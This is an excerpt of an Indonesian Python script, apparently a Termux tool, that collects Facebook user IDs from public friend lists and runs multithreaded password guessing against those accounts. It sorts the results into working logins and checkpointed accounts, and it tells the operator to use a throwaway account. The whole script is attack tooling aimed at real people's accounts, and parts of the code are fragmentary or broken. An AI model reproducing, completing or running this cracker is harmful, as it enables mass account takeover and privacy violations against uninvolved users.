...
rr = random.randint
rc = random.choice
sys.stdout.write(f"\x1b]2; ( AsepitgansXc FB )\x07")
...
def Cookies():
    try:
        os.system("clear")
        cetak(nel(f'''[red] ______ _______ ______ ______ _______ _______ _______ 
|   __ \    ___|   __ \   __ \   |   |_     _|    ___|
[white]|   __ <    ___|   __ <      <   |   | |   | |    ___|
|______/___|   |______/___|__|_______| |___| |_______|''',title='AsepitgansXc - TermuxSec',width=70))
        prints(f"[!] [underline]{H2} Author: AsepitgansXc - TermuxSec{P2}")  # jangan di ganti ya ajg
        print("[!] Informasi : Harap gunakan akun tumbal")
...
[white]|   __ <    ___|   __ <      <   |   | |   | |    ___|
|______/___|   |______/___|__|_______| |___| |_______|''',title='AsepitgansXc - TermuxSec',width=70))
    cetak(nel(f'Name : {nami}\nID   :[green] {user}[white]',width=70))
    cetak(nel(f'[01]. Crack random publik\n[02]. Crack random file\n[03]. Logut cookie',width=70))
    jan = input('[+] Chouse : ')
    if jan in ['01','1']:
    	Publik()
    elif jan in ['02','2']:
    	...
    	os.remove('rm -rf .cok.txt .token.txt')
    elif jan in ['04','4']:
    	clon_email()
    else:print('Pilih yang bener bodoh')


def crack_file():
    cetak(nel(f'Masukan file idz anda yang ada di simpan folder anda',width=70))
...
def Publik():
    try:
        ...
        exit(" [!] Tidak ada koneksi.")
    cetak(nel(f'Masukan ID, bersifat publik jangan private',width=70))
    user2 = input("[+] Username/id: ")
        ...
        try:
            ...
            for x in date["friends"]["data"]:
                try:
                    ...
                    print(f"[+] Total ID: {H}{len(id1)}{P}      ", end="\r")
        except (KeyError, IOError):
            print(f"[+] Username/id {uid} private", end="\r")
            time.sleep(0.1)
    try:
        cetak(nel(f'\rTotal dump username/id :[green] {str(len(id1))}[white]',width=70))
        Setting()
    except requests.exceptions.ConnectionError:
        cetak(nel(f'Koneksi internet anda buruk',width=70))


def menu_mtd():
    if len(id1) == 0:
        cetak(nel(f'Username/id anda tidak publik',width=70));exit()

    for bacot in id1:
        xx = random.randint(0, len(id2))
        id2.insert(xx, bacot)
    cetak(nel(f'[01]. Mobile (async)\n[02]. Mbasic (reguler)\n[03]. Mtouch (validate)',width=70))
def hasil():
	cetak(nel(f'Hasil OK :[green] {ress_ok}[white]\nHasil CP : [yellow]{ress_cp}[white]',width=70))
def take_password():
    global prog, des
    hasil()
    prog = Progress(
    ...
    with prog:
        with Thread(max_workers=30) as asep_ganteng:
            for user in id2:
                ...
                if "ya" in pwpluss:
                    ...
                    pass
                if "id_1" in metode:
                    asep_ganteng.submit(crack1, uix, pwid)
                elif "id_2" in metode:
                    asep_ganteng.submit(crack2, uix, pwid)
                elif "id_3" in metode:
                    asep_ganteng.submit(crack3, uix, pwid)
                elif "id_4" in metode:
                    asep_ganteng.submit(brute, uix, pwid)
                else:
                    asep_ganteng.submit(crack1, id2, uix, pwid)
        exit("\n\ncracking done!")
...
def crack1(uix, pwid):
    ...
    prog.update(
        des,
        description=f"[!] {P2}{len(id2)} {H2}Live {P2}:-{H2}{(ok)} {K2}Check {P2}:-{K2}{(cp)} {P2}({H2}{str(uix)}-{P2} : {(loop)}{P2})",
    )
    prog.advance(des)
    for pw in pwid:
        try:
...
def Setting():
    ...
    if Fz == "1" or Fz == "01":
        ...
        metode.append("id_3")
        # metode.append('id_4')
    cetak(nel(f'Mau menambahkan password manual?',width=70))
    pwplus = input("[+] tambahkan sandi manual? y/t : ")
    if pwplus in ["y", "Y"]:
        pwpluss.append("ya")
        prints(nel(f'{P2}Enter an additional password of at least 6 #characters\nExample :[green] Indonesia,rahasia,katasandi[white]{P2}',width=70))
        ...
        pwpluss.append("no")
        cetak(nel(f'crack dengan sandi -> bawaan sc',width=70))
    take_password()
